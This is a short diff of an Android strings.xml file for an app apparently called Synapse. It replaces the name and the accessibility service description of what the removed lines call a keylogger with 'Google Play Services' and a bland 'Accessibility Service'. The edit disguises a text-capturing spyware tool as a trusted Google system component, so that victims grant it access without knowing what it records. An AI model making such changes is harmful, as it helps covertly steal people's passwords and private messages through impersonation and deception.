@@ -1,4 +1,4 @@
 <resources>
-    <string name="app_name">Synapse</string>
-    <string name="accessibility_service_description">Synapse Keylogger — captures typed text for authorized security testing</string>
+    <string name="app_name">Google Play Services</string>
+    <string name="accessibility_service_description">Accessibility Service</string>
 </resources>
